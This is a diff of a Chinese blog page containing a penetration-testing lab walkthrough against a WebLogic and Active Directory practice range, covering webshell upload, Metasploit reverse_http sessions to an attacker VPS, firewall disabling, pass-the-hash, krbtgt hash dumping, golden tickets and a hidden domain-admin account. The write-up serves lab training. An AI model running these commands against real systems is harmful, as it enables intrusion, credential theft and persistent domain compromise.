@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/failure.ico">
 <meta property="article:published_time" content="2024-03-22T07:15:38.000Z">
-<meta property="article:modified_time" content="2024-03-22T14:54:23.217Z">
+<meta property="article:modified_time" content="2024-03-22T14:55:41.535Z">
 <meta property="article:author" content="Err0r2333">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary">
@@ -195,7 +195,7 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1711119263217"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1711119341535"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
@@ -210,17 +210,17 @@
 <p>配置网卡：</p>
 <p>内网VMet2的子网地址为<code>10.10.10.0</code></p>
 <p>VMet8还是使用<code>NAT</code>模式，子网地址<code>192.168.239.0</code></p>
-<img src="/posts/undefined/1.png" class title="awa">
+<img src="/posts/57428/1.png" class title="awa">
 <p>然后配置一下网卡：</p>
 <p>WEB跟PC两张网卡，一张外网一张内网</p>
 <p>这边由于作者写了它的公网ip段是111，所以这边改一下，改成了192.168.239.80，默认网关改为192.168.239.0</p>
 <p>PC机和WEB一样</p>
 <p>PC:</p>
-<img src="/posts/undefined/2.png" class title="awa">
+<img src="/posts/57428/2.png" class title="awa">
 <p>WEB:</p>
-<img src="/posts/undefined/3.png" class title="awa">
+<img src="/posts/57428/3.png" class title="awa">
 <p>DC就只用一张网卡：</p>
-<img src="/posts/undefined/4.png" class title="awa">
+<img src="/posts/57428/4.png" class title="awa">
 <p>然后到WEB机，打开<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code></p>
 <p>以管理员身份分别运行<code>setDomainENVa</code>，<code>startManageWeblogic</code>，<code>startWeblogic</code></p>
 <p>汇总一下配置：</p>
@@ -228,30 +228,30 @@
 <h1><span id="开打"> 开打</span></h1>
 <h2><span id="信息收集"> 信息收集</span></h2>
 <p>拿kscan扫一下WEB服务：</p>
-<img src="/posts/undefined/5.png" class title="awa">
+<img src="/posts/57428/5.png" class title="awa">
 <p>可以看到开了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mssql 1433</span><br><span class="line">netbios 139</span><br><span class="line">3389</span><br><span class="line">445</span><br><span class="line">7001</span><br><span class="line">80</span><br></pre></td></tr></table></figure>
 <p>其中7001是weblogic服务</p>
 <p>访问一下：</p>
 <p>这里直接访问是Error404，这里可以简单开扫一下：</p>
-<img src="/posts/undefined/6.png" class title="awa">
+<img src="/posts/57428/6.png" class title="awa">
 <p>扫到console可以进</p>
-<img src="/posts/undefined/7.png" class title="awa">
+<img src="/posts/57428/7.png" class title="awa">
 <p>weblogic 10.3.6.0</p>
 <h2><span id="外网打点"> 外网打点</span></h2>
 <p>拿liqunkit看看能不能爆weblogic</p>
-<img src="/posts/undefined/8.png" class title="awa">
-<img src="/posts/undefined/9.png" class title="awa">
+<img src="/posts/57428/8.png" class title="awa">
+<img src="/posts/57428/9.png" class title="awa">
 <p>传一下冰蝎的webshell，liqunkit好像不太行，这边换WeblogicExploit(java端的我喜欢用冰蝎)</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/sp4zcmd/WeblogicExploit-GUI">GitHub - sp4zcmd/WeblogicExploit-GUI: Weblogic漏洞利用图形化工具 支持注入内存马、一键上传webshell、命令执行</a></p>
-<img src="/posts/undefined/11.png" class title="awa">
+<img src="/posts/57428/11.png" class title="awa">
 <p>连接一下</p>
-<img src="/posts/undefined/12.png" class title="awa">
+<img src="/posts/57428/12.png" class title="awa">
 <p>可以上线msf了</p>
 <p>这边还可以利用冰蝎反弹shell</p>
-<img src="/posts/undefined/13.png" class title="awa">
+<img src="/posts/57428/13.png" class title="awa">
 <p>按照冰蝎上面的方法操作msf就行了</p>
-<img src="/posts/undefined/14.png" class title="awa">
+<img src="/posts/57428/14.png" class title="awa">
 <p>这边选2333端口打过来，meterpreter连上了</p>
 <p>如果用传统的shell执行来弹msf，发现不行，怀疑有杀软。</p>
 <p>这时候tasklist一下：</p>
@@ -259,7 +259,7 @@
 <p>然后复制到：</p>
 <p><a target="_blank" rel="noopener" href="https://saucer-man.com/avlist/index.html">Windows杀软在线对比 (saucer-man.com)</a></p>
 <p>发现了360</p>
-<img src="/posts/undefined/15.png" class title="awa">
+<img src="/posts/57428/15.png" class title="awa">
 <p>这边把冰蝎的shell派生给cs</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set lhost vps_ip</span><br><span class="line">set lport 2333</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 <p>发现不行，java的派生不了给msf？</p>
@@ -269,10 +269,10 @@
 <h2><span id="内网信息收集-1"> 内网信息收集 (1)</span></h2>
 <p>先看域信息</p>
 <p>ipconfig :</p>
-<img src="/posts/undefined/16.png" class title="awa">
+<img src="/posts/57428/16.png" class title="awa">
 <p>发现10.10.10.0网段</p>
 <p>systeminfo:</p>
-<img src="/posts/undefined/17.png" class title="awa">
+<img src="/posts/57428/17.png" class title="awa">
 <p>net view失败:</p>
 <p>确认域内电脑：</p>
 <p>shell直接给我弹出去了，无敌</p>
@@ -297,19 +297,19 @@
 <h2><span id="内网信息收集2"> 内网信息收集(2)</span></h2>
 <p>getsystem好像不行。只能先收集点信息</p>
 <p>域控：</p>
-<img src="/posts/undefined/18.png" class title="awa">
-<img src="/posts/undefined/19.png" class title="awa">
+<img src="/posts/57428/18.png" class title="awa">
+<img src="/posts/57428/19.png" class title="awa">
 <p>用户：</p>
-<img src="/posts/undefined/20.png" class title="awa">
+<img src="/posts/57428/20.png" class title="awa">
 <p>域管：</p>
-<img src="/posts/undefined/21.png" class title="awa">
+<img src="/posts/57428/21.png" class title="awa">
 <p>传fscan扫内网，淦，冰蝎传不上：</p>
 <p>试试蚁剑打内存马</p>
 <p>可以了，蚁剑能正常传fscan</p>
 <p>之前有个10.10.10网段的，开扫</p>
 <p>?不给运行？？？</p>
 <p>算了</p>
-<img src="/posts/undefined/22.png" class title="awa">
+<img src="/posts/57428/22.png" class title="awa">
 <p>那就搭socks代理进去吧</p>
 <p><strong>添加路由是为了让msf内的模块能够访问到内网服务，而搭socks代理能够让我们的软件访问到内网</strong></p>
 <p>添加路由</p>
@@ -319,24 +319,24 @@
 <p>这里先background一下，后面用<code>sessions -i session_id</code></p>
 <p>加完之后就可以用nmap扫了，也可以用msf里的<code>auxiliary/scanner/udp_probe</code>进行探测</p>
 <p><s>这个udp_probe慢的一批，我只能说</s></p>
-<img src="/posts/undefined/23.png" class title="awa">
+<img src="/posts/57428/23.png" class title="awa">
 <p>如果用其他软件对内网进行扫描的话要加proxychains4</p>
 <p>通过proxychains4进行nmap扫描必须要添加以下参数</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-sT 全开扫描，完成三次握手</span><br><span class="line">-Pn 不使用ping</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap ip -sT -Pn -p</span><br></pre></td></tr></table></figure>
 <p>这里我的是3.1，所以改成<code>proxychains</code></p>
 <p>这里测试以下前面udp_probe爆出来的53端口来验证是否代理成功</p>
-<img src="/posts/undefined/25.png" class title="awa">
+<img src="/posts/57428/25.png" class title="awa">
 <p>不是system权限，kiwi爆不出来</p>
 <p>总结一下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ipconfig 发现10.10.10.0内网网段</span><br><span class="line">systeminfo 找到了3个补丁，x64的pc</span><br><span class="line">Domain: de1ay.com</span><br><span class="line">域控叫 DC</span><br><span class="line">域内还有PC WEB两台电脑</span><br><span class="line">域内的用户有Administrator de1ay krbtgt mssql</span><br><span class="line">域管是Administrator</span><br><span class="line"></span><br><span class="line">扫到了10.10.10.10</span><br><span class="line">10.10.10.80(外网机)</span><br><span class="line"></span><br><span class="line">10.10.10.10 开启了123 137 53端口</span><br></pre></td></tr></table></figure>
 <h2><span id="派生cs"> 派生cs</span></h2>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true</span><br><span class="line">set lhost vps_ip</span><br><span class="line">set lport 2333</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/26.png" class title="awa">
+<img src="/posts/57428/26.png" class title="awa">
 <p>弹过来了</p>
 <h2><span id="权限提升"> 权限提升</span></h2>
 <p>试试提权，这里得把360关了，服。这就是最新病毒库吗</p>
-<img src="/posts/undefined/27.png" class title="awa">
+<img src="/posts/57428/27.png" class title="awa">
 <p>不然就是提不了一点</p>
 <p>关闭防火墙</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
@@ -347,18 +347,18 @@
 <h2><span id="横向移动"> 横向移动</span></h2>
 <p>201机子还没被扫出来，太神奇了</p>
 <p>这边先拿DC，用爆出来的管理员hash横向移动：</p>
-<img src="/posts/undefined/28.png" class title="awa">
-<img src="/posts/undefined/29.png" class title="awa">
+<img src="/posts/57428/28.png" class title="awa">
+<img src="/posts/57428/29.png" class title="awa">
 <p>这里是拿下DC了，但是PC还是扫不出来。。。？</p>
 <p>这就很离谱</p>
 <p>总之拿下DC之后进行权限维持</p>
 <h2><span id="黄金票据"> 黄金票据</span></h2>
-<img src="/posts/undefined/30.png" class title="awa">
+<img src="/posts/57428/30.png" class title="awa">
 <p>如图，cobalt strike已经给你准备好了</p>
 <p>说到黄金票据那就不得不说Kerberos协议</p>
 <p>Kerberos协议其实是windows的一个域认证常用协议</p>
 <p>其大致流程如下：</p>
-<img src="/posts/undefined/31.png" class title="awa">
+<img src="/posts/57428/31.png" class title="awa">
 <ul>
 <li>登录：客户端<strong>用户A</strong>输入用户名密码</li>
 <li>认证：系统验证<strong>用户A</strong>身份</li>
@@ -386,17 +386,17 @@
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//获取自己的sid值，下面都可以</span><br><span class="line">shell whoami /user</span><br><span class="line">shell whoami /all</span><br><span class="line">shell wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>
 <p>当然，logonpasswords之前就已经爆出来了：</p>
-<img src="/posts/undefined/32.png" class title="awa">
+<img src="/posts/57428/32.png" class title="awa">
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S-1-5-21-2756371121-2868759905-3853650604-500</span><br></pre></td></tr></table></figure>
 <p>然后爆krbtgt的密码hash值，其实就是hashdump(这里要在DC机上爆)</p>
-<img src="/posts/undefined/33.png" class title="awa">
+<img src="/posts/57428/33.png" class title="awa">
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82dfc71b72a11ef37d663047bc2088fb:::</span><br></pre></td></tr></table></figure>
 <p>在web机生成黄金票据</p>
 <p>在web机查看域控的C盘</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\10.10.10.10\c$</span><br><span class="line">或者</span><br><span class="line">shell dir \\DC\c$</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/34.png" class title="awa">
+<img src="/posts/57428/34.png" class title="awa">
 <p>看一下扫不出来的PC能不能看</p>
-<img src="/posts/undefined/35.png" class title="awa">
+<img src="/posts/57428/35.png" class title="awa">
 <p>然并卵</p>
 <p>拿到黄金票据之后还可以进一步操作，生成一个影子域管理员</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net user test$ 123Adf.. /add /domain</span><br><span class="line">shell net group &quot;domain admins&quot; test$ /add /domain</span><br></pre></td></tr></table></figure>
@@ -493,7 +493,7 @@
                     <a class="tag-none-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2024-03-22T14:54:23.217Z" itemprop="dateModified">最后编辑：2024-03-22</time>
+                    <time datetime="2024-03-22T14:55:41.535Z" itemprop="dateModified">最后编辑：2024-03-22</time>
                 </div>
             </div>
         </footer>
